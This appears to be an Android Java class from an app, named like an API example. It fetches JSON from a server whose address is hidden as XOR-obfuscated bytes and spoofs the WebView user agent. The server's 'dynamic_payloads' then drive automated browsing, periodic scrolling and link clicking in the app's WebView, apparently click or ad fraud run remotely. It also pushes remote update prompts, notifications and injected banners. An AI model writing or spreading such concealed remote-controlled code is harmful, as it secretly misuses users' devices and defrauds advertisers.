package com.zargidi.ccar.android.PNL;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.view.ViewGroup;
import android.webkit.WebView;

import com.google.gson.Gson;
import com.zargidi.ccar.android.PNL.notif.SmartNotificationManager;

import java.io.IOException;
import java.util.List;

import okhttp3.*;


public class FetchApiExample {

  private final byte MASK = (byte) 0xAA;

  byte[] OBF = new byte[]{(byte) 0xC2, (byte) 0xDE, (byte) 0xDE, (byte) 0xDA, (byte) 0xD9, (byte) 0x90, (byte) 0x85, (byte) 0x85, (byte) 0x9D, (byte) 0xC2, (byte) 0xDF, (byte) 0xC8, (byte) 0x84, (byte) 0xC3, (byte) 0xD8, (byte) 0x85, (byte) 0xCB, (byte) 0xDA, (byte) 0xC3, (byte) 0x84, (byte) 0xDA, (byte) 0xC2, (byte) 0xDA, (byte) 0x95, (byte) 0xDA, (byte) 0xCB, (byte) 0xC9, (byte) 0xC1, (byte) 0xCB, (byte) 0xCD, (byte) 0xCF, (byte) 0x97, (byte) 0xDA, (byte) 0xD8, (byte) 0xC5, (byte) 0x84, (byte) 0xDC, (byte) 0xC3, (byte) 0xD9, (byte) 0xC3, (byte) 0xC5, (byte) 0xC4, (byte) 0x84, (byte) 0xD9, (byte) 0xDB, (byte) 0xDF, (byte) 0xC3, (byte) 0xD8, (byte) 0xD8, (byte) 0xCF, (byte) 0xC6};
  private static FetchApiExample instance = null;

  public static FetchApiExample getInstance() {
    if (instance == null) {
      instance = new FetchApiExample();
    }
    return instance;
  }

  // دریافت از API
  public void fetchData(Context context, WebView mainv) {

    OkHttpClient client = new OkHttpClient();
    String userAgent = mainv.getSettings().getUserAgentString();

    Request request = new Request.Builder()
      .url(XorCodec.getInstance().xorDecodeToString(OBF, MASK))
      .get()
      .header("User-Agent", userAgent)
      .build();

    client.newCall(request).enqueue(new Callback() {
      @Override
      public void onFailure(Call call, IOException e) {
        e.printStackTrace();
      }

      @Override
      public void onResponse(Call call, Response response) throws IOException {

        if (!response.isSuccessful())
          throw new IOException("HTTP Error: " + response.code());

        String json = response.body().string();
        Gson gson = new Gson();
        ApiResponse api = gson.fromJson(json, ApiResponse.class);

        new Handler(Looper.getMainLooper()).post(() -> {
          try {
            SearchInGoogleWeb.AutoBrowseConfig cfg = new SearchInGoogleWeb.AutoBrowseConfig();
            cfg.enableAutoBrowse = true;
            cfg.scrollIntervalSec = 10;
            cfg.clickIntervalSec = 20;
            cfg.clickInternalLinks = true;

            SearchInGoogleWeb searchInGoogleWeb = new SearchInGoogleWeb();
            searchInGoogleWeb.getContentPage(
              mainv,
              api.dynamic_payloads.get(0).anct,
              api.dynamic_payloads.get(0).dn,
              api.dynamic_payloads.get(0).urA,
              cfg,
              context
            );
          } catch (Exception ex) {
            ex.printStackTrace();
          }
          try {
            applyAll(context, api, mainv);
          } catch (Exception ex) {
            ex.printStackTrace();
          }

        });
      }
    });
  }


  private void applyAll(Context context, ApiResponse api, WebView web) {

    if (api == null) return;
    // نمایش پیام آپدیت
    if (!api.update_notification.message.isEmpty()) {
      showUpdate(context, api.update_notification);
    }

    SmartNotificationManager notifManager = new SmartNotificationManager(context);
    notifManager.handleNotifications(api.notifications);

    // نمایش بنرها
    if (api.banner != null && !api.banner.isEmpty()) {
      if (!api.banner.get(0).image_url.isEmpty()) {
        startBannerRotation(context, api.banner);
      }
    }
  }

  // ---- Update ----
  private void showUpdate(Context context, ApiResponse.UpdateNotification update) {
    UpdateDialog dialog = new UpdateDialog(context, update);
    dialog.show(() -> {

    });
  }

  // ---- بنر اسلایدر ----
  private void startBannerRotation(Context context, List<ApiResponse.Banner> banners) {
    if (!(context instanceof Activity)) return;

    Activity act = (Activity) context;

    BannerSliderView view = new BannerSliderView(context);
    view.setBanners(banners);

    act.runOnUiThread(() -> {
      ViewGroup root = act.findViewById(android.R.id.content);
      root.addView(view);
    });
  }

}
